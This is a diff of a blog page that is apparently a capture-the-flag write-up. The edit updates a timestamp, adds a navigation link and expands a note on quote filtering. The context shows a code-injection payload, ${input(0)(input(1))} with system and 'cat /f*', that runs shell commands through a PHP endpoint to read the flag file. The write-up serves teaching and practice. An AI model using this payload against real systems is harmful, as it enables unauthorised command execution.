@@ -15,7 +15,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/image-20251128165447668.png">
 <meta property="article:published_time" content="2025-11-28T08:39:41.000Z">
-<meta property="article:modified_time" content="2025-11-28T10:52:01.920Z">
+<meta property="article:modified_time" content="2025-11-28T12:46:52.828Z">
 <meta property="article:author" content="Rufeii">
 <meta property="article:tag" content="脏数据">
 <meta property="article:tag" content="flask内存马">
@@ -89,6 +89,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -206,7 +208,7 @@
 <p>引号没了，有个特性就是利用<code>&#123;&#125;</code>进行RCE</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:/public/index.php</span><br><span class="line">code=<span class="built_in">$</span>&#123;input(0)(input(1))&#125;<span class="built_in">&amp;</span>0=system<span class="built_in">&amp;</span>1=cat /f*</span><br></pre></td></tr></table></figure>
 
-<p>利用input函数绕过引号，然后拿到flag</p>
+<p>利用input函数绕过引号，然后拿到flag，但是哈这里${}被单引号包裹的时候就不能rce，而是被当作字面量，所以需要绕过</p>
 
   </div>
 </article>
